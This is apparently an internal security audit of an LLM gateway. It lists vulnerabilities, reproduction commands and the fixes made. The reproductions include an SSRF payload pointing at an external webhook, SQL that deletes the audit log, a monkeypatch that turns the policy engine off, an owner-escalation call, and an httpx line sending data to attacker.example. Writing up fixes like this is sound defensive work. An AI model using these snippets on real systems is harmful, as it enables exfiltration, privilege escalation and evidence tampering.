# Part 1 
## 1. Disable API Documentation Endpoints in Production

## Finding

The production gateway exposed a full route inventory through OpenAPI and docs endpoints.

## Reproduction

Command:

```powershell
curl.exe -sS "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/openapi.json"
```

Observed result:

- Returned the OpenAPI schema with route and channel details.

## Fix Implemented

Updated the FastAPI app configuration in main.py to disable docs and OpenAPI routes in production:

```python
docs_url=None if PRODUCTION_MODE else "/docs"
redoc_url=None if PRODUCTION_MODE else "/redoc"
openapi_url=None if PRODUCTION_MODE else "/openapi.json"
```

## Security Invariant

Attackers must not be able to enumerate API capabilities or sensitive route metadata in production.


## 2.Require Bearer Token for Sensitive Operational Endpoints

## Finding

The production gateway allowed unauthenticated access to operational metadata endpoints:

- /v1/capabilities
- /v1/providers
- /v1/status

## Reproduction

Commands:

```powershell
curl.exe -i -sS "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/capabilities"
curl.exe -i -sS "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/providers"
curl.exe -i -sS "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/status"
```

Observed result:

- Endpoint responses were accessible without authentication.They reveal details about provider order, the model behind each provider, and the exact rate limits

## Fix Implemented

Added global production HTTP bearer-auth middleware in main.py so all API routes require a gateway token.

```python
@app.middleware("http")
async def _gateway_auth_middleware(request: Request, call_next):
	if PRODUCTION_MODE:
		path = request.url.path
		if path in HIDDEN_DOC_PATHS or path.startswith("/docs/"):
			return JSONResponse(status_code=404, content={"detail": "Not Found"})
		require_gateway_bearer(request.headers.get("authorization"))
	return await call_next(request)
```

## Security Invariant

Attackers must not be able to access provider/capability/status metadata in production without a valid bearer token.


## 3. Unauthenticated LLM Abuse

## Finding

The production gateway allowed direct unauthenticated access to LLM execution endpoints, enabling abuse of paid model inference.

## Reproduction

Commands:

```powershell
curl.exe -i -sS -X POST "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/chat" -H "Content-Type: application/json" -d "{}"
curl.exe -i -sS -X POST "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/vision" -H "Content-Type: application/json" -d "{}"
curl.exe -i -sS -X POST "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/embed" -H "Content-Type: application/json" -d "{}"
curl.exe -i -sS -X POST "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/transcribe" -H "Content-Type: application/json" -d "{}"
curl.exe -i -sS -X POST "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/speak" -H "Content-Type: application/json" -d "{}"
```

Observed result (before fix):

- Requests could reach LLM-serving endpoints without any bearer token, allowing unauthorized usage attempts.

## Fix Implemented

Applied the same global production bearer-auth middleware in main.py so all HTTP API routes, including LLM routes, require Authorization: Bearer <gateway_token>.

```python
@app.middleware("http")
async def _gateway_auth_middleware(request: Request, call_next):
	if PRODUCTION_MODE:
		path = request.url.path
		if path in HIDDEN_DOC_PATHS or path.startswith("/docs/"):
			return JSONResponse(status_code=404, content={"detail": "Not Found"})
		require_gateway_bearer(request.headers.get("authorization"))
	return await call_next(request)
```

## Security Invariant

Attackers must not be able to trigger LLM inference or consume provider quota in production without a valid bearer token.

## 4. Unauthenticated URL Fetch (SSRF) via Image URL Resolution

## Finding

The gateway resolved user-supplied `image_url` values during `/v1/chat` processing without destination restrictions, which could be abused for SSRF against internal services.

## Reproduction

Command:

```powershell
curl.exe -s -X POST "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/chat" ^
	-H "content-type: application/json" ^
	-d "{\"model\":\"gemini-2.5-flash\",\"messages\":[{\"role\":\"user\",\"content\":[{\"type\":\"image_url\",\"image_url\":{\"url\":\"https://webhook.site/7d6732a1-732b-42c7-9f82-1fa5fb41390e\"}}]}]}"
```

Observed result (before fix):

- The server attempted to fetch attacker-controlled URLs while converting `http(s)` image URLs to data URLs.
- Redirects were followed automatically, enabling redirect-to-internal bypass attempts.

## Fix Implemented

Hardened image URL fetching in `glc/routes/chat.py`:

- Added destination allowlist via `GLC_IMAGE_FETCH_ALLOWLIST`.
- Blocked loopback/private/link-local/multicast/reserved/unspecified ranges for IPv4 and IPv6 after DNS resolution.
- Disabled automatic redirect following and re-validated every redirect target before each hop.

Key logic (summary):

```python
_validate_image_fetch_destination(current, allowlist_entries)
r = await client.get(current)
if redirect:
		current = join(location)
		continue  # destination is re-validated on next loop iteration
```

## Security Invariant

User-controlled URL fetches must never reach loopback/private/link-local/internal destinations, and redirect chains must not bypass destination validation.

## 5. Tenant Scoping for Usage and Cost Read Endpoints

## Finding

The usage and cost read endpoints exposed cross-tenant activity because results were not scoped to the requesting tenant:

- `/v1/calls`
- `/v1/cost/by_agent`

## Reproduction

Commands (same auth, different tenant headers):

```powershell
curl.exe -sS -H "Authorization: Bearer <gateway_token>" -H "X-GLC-Tenant: tenant_a" "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/calls"
curl.exe -sS -H "Authorization: Bearer <gateway_token>" -H "X-GLC-Tenant: tenant_b" "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/calls"

curl.exe -sS -H "Authorization: Bearer <gateway_token>" -H "X-GLC-Tenant: tenant_a" "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/cost/by_agent"
curl.exe -sS -H "Authorization: Bearer <gateway_token>" -H "X-GLC-Tenant: tenant_b" "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/cost/by_agent"
```

Observed result (before fix):

- Tenant A and Tenant B could view records from a shared/global ledger view.

## Fix Implemented

Implemented tenant-aware read/write scoping:

- Added `tenant` column and index in `glc/db.py` and backfilled schema migration via `PRAGMA table_info` + `ALTER TABLE` when missing.
- Added `tenant` write-through in `db.log_call(...)` for chat/router/embed call logging.
- Added tenant filtering to:
	- `db.recent(..., tenant=...)` used by `/v1/calls`
	- `db.by_agent(..., tenant=...)` used by `/v1/cost/by_agent`
- Added header-based tenant resolver `tenant_from_headers(...)` in `glc/security/auth.py`:
	- Header precedence: `X-GLC-Tenant`, then `X-Tenant-ID`
	- Defaults to `default` tenant when header is absent
	- Rejects invalid tenant identifiers with `400`

## Security Invariant

Usage and cost telemetry must be visible only to records belonging to the requesting tenant.

## 6. Verbose upstream errors leak provider internals

## Finding

When provider calls failed, the gateway returned raw upstream error details to callers. Responses could reveal:

- Provider identity
- Upstream API hostnames (for example, `generativelanguage.googleapis.com`)
- Upstream HTTP status details
- Raw provider error body content

This leaked backend topology and implementation details to unauthenticated or low-trust clients.

## Reproduction

Command (force a provider-side failure path):

```powershell
curl.exe -i -sS -X POST "https://rainitover--glc-v1-gateway-fastapi-app.modal.run/v1/chat" ^
	-H "Authorization: Bearer <gateway_token>" ^
	-H "content-type: application/json" ^
	-d "{\"provider\":\"gemini\",\"model\":\"invalid-model\",\"messages\":[{\"role\":\"user\",\"content\":\"hi\"}]}"
```

Observed result (before fix):

- Client-visible error included provider-specific internals and upstream details.

## Fix Implemented

Replaced client-facing `HTTPException` details that embedded provider/error objects with generic messages in `glc/routes/chat.py`.

Updated behavior:

- Chat provider failures now return generic 502/503 messages.
- Embed provider failures now return generic 429/400/502/503 messages.
- Full upstream details remain in server-side call logs (`db.log_call(...)`) for debugging.

Examples of sanitized responses:

```text
502 upstream provider request failed
503 all providers unavailable
429 upstream provider rate limited
400 upstream provider rejected embed request
502 upstream provider embed request failed
503 no embedding providers available
```

## Security Invariant

Client-facing errors must not disclose provider names, upstream hostnames, or raw upstream payloads.

## Leaks

1. Dump every provider key (Leak 1)

## Partial Mitigation (Defense-in-Depth)

Implemented a partial mitigation to reduce accidental secret exposure from process environment variables:

- Added `scrub_provider_key_env()` and `PROVIDER_SECRET_ENV_VARS` in `glc/providers.py`.
- Called scrub step at startup in `glc/main.py` after provider objects are created.
- Added `GLC_SCRUB_PROVIDER_KEYS` toggle (default enabled: `1`).

## 2. Erase the audit log (Leak 2)

## Finding

The audit table could be emptied or modified without an integrity signal. Deletion/tampering left no cryptographic evidence in the log stream.

## Reproduction

Representative tamper operations:

```sql
DELETE FROM audit_log;
-- or
UPDATE audit_log SET result_json='tampered' WHERE id=1;
```

Observed result (before fix):

- No built-in hash-chain integrity check failed because no chain existed.
- Consumers could not prove whether historical records were altered.

## Fix Implemented

Implemented append-only hash chaining in the audit store:

- Added `prev_hash` to `audit_log` schema.
- Added migration-safe schema upgrade in `init_store()`:
	- checks `PRAGMA table_info(audit_log)`
	- `ALTER TABLE ... ADD COLUMN prev_hash` when missing
	- records schema version `2` in `audit_schema`
- On every `append()` call:
	- loads the previous row
	- computes `sha256` over the previous row's canonical fields
	- stores that digest in the new row's `prev_hash`
- Added `verify_chain()` in `glc/audit/store.py` to validate the full chain.

Files changed:

- `glc/audit/store.py`
- `glc/audit/schema.sql`
- `glc/audit/__init__.py`

## Security Invariant

Components must not be able to edit or delete their own audit logs.

## 3. Escalate to owner (Leak 3)

## Finding

Owner bootstrap helper `force_pair_owner(...)` was callable from in-process code. In a shared-process model, a malicious in-process component could force owner pairing directly.

## Reproduction

```python
from glc.security.pairing import get_pairing_store
get_pairing_store().force_pair_owner("telegram", "attacker-id", user_handle="me")
```

Observed result (before fix):

- Call succeeded and created `owner_paired` trust for attacker-controlled identity.

## Partial Fix Implemented

Added production guardrails around `force_pair_owner(...)` in `glc/security/pairing.py`:

- In `GLC_ENV=production|prod`, `force_pair_owner` is blocked by default.
- Explicit override required: `GLC_ALLOW_FORCE_PAIR_OWNER=1`.
- Added tests in `tests/test_pairing_force_owner_guard.py`.

## Security Invariant

Every action must be checked against the actual user, tenant, and final arguments.


## 4. Read the install token (Leak 4)

## Finding

Installer-token export was reachable from the same Python process boundary. In a shared-process design, any in-process component can potentially invoke token-export logic and obtain installer credentials.

## Reproduction

Command:

```powershell
uv run glc token
```

Observed result (before fix):

- The command printed the install token even in production-like runtime.

## Partial Fix Implemented

Added a guarded token-export path so installer token display is blocked by default in production:

- Added `get_install_token_for_display()` in `glc/config.py`.
- Guard condition:
	- when `GLC_ENV=production` (or `prod`), token export is denied unless `GLC_ALLOW_TOKEN_EXPORT=1`.
- Updated `glc token` command in `glc/cli.py` to call the guarded helper.
- Added tests in `tests/test_cli_token_guard.py` for both blocked and override-allowed behavior.

## Security Invariant

Installer-token export must be explicitly opt-in in production runtime and must not be available by default.

## 5. Disable Policy Engine (Leak 5)

## Reproduce

```python
import glc.policy.engine as e
from glc.policy.schemas import PolicyVerdict
e.evaluate = lambda *a, **k: PolicyVerdict(action="allow", reason="pwned")
```

## Invariant Broken

Policy decisions must not be bypassable via in-process monkeypatching in production runtime.

External content must always be treated as data, never as instructions.

## Fix

Added a production tamper guard in `glc/policy/engine.py` that blocks reassignment of module-level `evaluate` by default:

- Guard is active when `GLC_ENV=production|prod` (or `GLC_PRODUCTION=1`).
- Monkeypatch override requires explicit opt-in: `GLC_ALLOW_POLICY_MONKEYPATCH=1`.

## 6. Network egress from in-process adapters (Leak 6)

## Finding

Channel/adapter code shares process and network privileges with the gateway in the default model. A compromised adapter could initiate arbitrary outbound connections and exfiltrate data to attacker-controlled infrastructure.

## Reproduce

Representative abuse path:

```python
# example malicious behavior inside adapter/runtime code
import httpx
httpx.post("https://attacker.example/exfil", json={"sample": "sensitive-data"})
```

Observed risk (before fix):

- No adapter-specific egress policy boundary at runtime.
- Adapter code could use broad outbound network access from the gateway trust domain.

## Invariant Broken

Untrusted or compromised adapter execution must not have unrestricted outbound network access.

## Partial Fix Implemented

Added Modal Sandbox launcher in `modal_app.py` to run adapters in an isolated runtime with outbound network restrictions:

- New `launch_adapter_sandbox(...)` function creates a sandboxed adapter process.
- Enforced `outbound_domain_allowlist` so sandbox egress is limited to approved LLM provider domains.
- Added `LLM_PROVIDER_EGRESS_ALLOWLIST` with provider API domains used by the gateway.
- Sandbox keeps existing mounted data volume and secrets wiring, but with constrained outbound destination policy.

Allowed domains currently configured:

- `generativelanguage.googleapis.com`
- `api.groq.com`
- `integrate.api.nvidia.com`
- `api.cerebras.ai`
- `openrouter.ai`
- `models.github.ai`

## Residual Risk / Scope Note

This is a partial hardening step. It introduces a process/network boundary for adapters launched via the sandbox path, but full protection depends on routing all relevant adapter execution through this sandboxed path and maintaining a tight allowlist over time.

## 7. Unrestricted subprocess and shell access (Leak 7)

## Finding

The `whisper_cpp` speech-to-text slot shells out to a `whisper-cli` binary via subprocess execution:

```python
subprocess.run([cli, "-m", model, "-f", audio_path, "-oj"])
```

In a monolithic runtime, adapter code can invoke subprocesses and installed binaries from the same trust boundary as the gateway.

## Invariant Broken

Compromised or untrusted adapter components must not be able to execute arbitrary binaries with gateway-level privileges.

## Status

Partial fix implemented (not closed).

## Partial Fix Implemented

Hardened the Modal adapter launcher path in `modal_app.py` to reduce subprocess/shell abuse blast radius:

- Removed arbitrary `command` override from `launch_adapter_sandbox(...)`.
- Added `ADAPTER_MODULE_ALLOWLIST` so only known adapter modules can be launched.
- Forced adapter entrypoint to `python -I -m <allowed_module>`.
- Added adapter-specific network policy:
	- default: `outbound_domain_allowlist` for approved provider domains
	- strict no-egress mode (`block_network=True`) for selected local adapters (`local_mic`)

## Required Fix Direction

The robust fix is defense in depth with component isolation, not a single control:

- Per-component minimal images
- Sandbox/process isolation per adapter/component
- Non-root execution
- Read-only filesystems
- System-call filtering
- Strict outbound egress limits

## Scope Note

Removing the shell alone is not sufficient. A Python process can still execute installed binaries and open sockets directly, so process isolation plus runtime policy controls are required together.

## 8. Kill the gateway process from inside runtime (Leak 8)

## Finding

In a shared process boundary, adapter/runtime code can terminate the hosting process directly with OS signals.

## Reproduce

```python
import os, signal
os.kill(os.getpid(), signal.SIGTERM)
```

Observed risk (before isolation change):

- If attacker-controlled logic executes inside the same process boundary as the gateway, it can terminate the gateway process.

## Invariant Broken

Every run must have hard limits on time, tokens, tool calls, and cost.

## Status

Partial fix implemented (not closed).

## Partial Fix Implemented

Strengthened process isolation in `modal_app.py`:

- Split runtime boundaries into `gateway_image` and `adapter_image`.
- Launched adapter sandboxes under a dedicated app namespace (`glc-v1-adapters`) via `modal.App.lookup(...)`.
- Adapter execution now runs in separate sandbox containers, so `os.kill(os.getpid(), ...)` in adapter code targets the adapter container process, not the gateway server process.

## Residual Risk / Scope Note

This mitigation depends on routing adapter execution through the sandboxed path. Any code path that still executes untrusted adapter logic in the gateway process remains in scope until fully isolated.

## 9. Cross-channel envelope spoofing (Leak 9)

## Finding

The channel envelope contains a caller-controlled `channel` field. Before the fix, route handlers trusted this field even when it did not match the route channel (`/v1/channels/{name}`), enabling cross-channel spoofing.

Impact:

- A client connected to one channel route could submit an envelope claiming a different channel.
- Policy, allowlist, rate limit, and audit paths could be evaluated/logged under spoofed channel context.

## Reproduce

WebSocket example:

1. Connect to `/v1/channels/telegram`.
2. Send envelope payload with `"channel": "discord"`.

Webhook example:

1. POST to `/v1/channels/telegram/webhook`.
2. Adapter returns `ChannelMessage(channel="discord", ...)`.

Observed risk (before fix):

- Route channel and envelope channel could diverge without a hard reject.

## Invariant Broken

Every action must be checked against the actual user, tenant, and final arguments.

## Fix Implemented

Updated `glc/routes/channels.py` to enforce strict channel binding:

- In WebSocket handler:
	- validate `env.channel == name`
	- on mismatch: append `channel_spoof_drop` audit event, send error, close socket with policy violation (`1008`)
- In webhook handler:
	- validate `msg.channel == name`
	- on mismatch: append `channel_spoof_drop` audit event and return `400 {"error": "envelope channel mismatch"}`

## 10. Cost-ledger poisoning via unvalidated ledger writes (Leak 10)

## Finding

The worker-call ledger accepted unvalidated values in `glc.db.log_call(...)`. An attacker-controlled in-process caller could write fabricated token counts and poison `/v1/cost/by_agent` and related analytics.

## Reproduce

```python
import glc.db
glc.db.log_call(provider="gemini", model="x", input_tokens=999_999_999, agent="victim")
```

Observed risk (before fix):

- Oversized/fabricated token counts were accepted and persisted.
- Ledger aggregates could be skewed by malicious or invalid writes.

## Invariant Broken

Usage and cost telemetry must be derived from validated inputs and must reject malformed or out-of-range accounting values.

## Fix Implemented

Added input validation in `glc/db.py` before insert:

- Required non-empty strings for `provider` and `model`.
- Added integer type checks and bounded ranges for:
	- `input_tokens`, `output_tokens`, `cache_create_tokens`, `cache_read_tokens` (max `10_000_000`)
	- `latency_ms` (max `3_600_000`)
	- `prompt_chars`, `response_chars` (max `5_000_000`)
	- `tool_calls` (max `10_000`)
	- `retries` (max `100`)
	- `embed_dim` when present (min `1`, max `1_000_000`)
- Invalid writes now fail fast with `ValueError` and are not persisted.

## Residual Risk / Scope Note

This closes unbounded-value poisoning, but does not cryptographically attest provenance of every in-process ledger write. Full integrity requires stronger provenance controls or process isolation for untrusted writers.











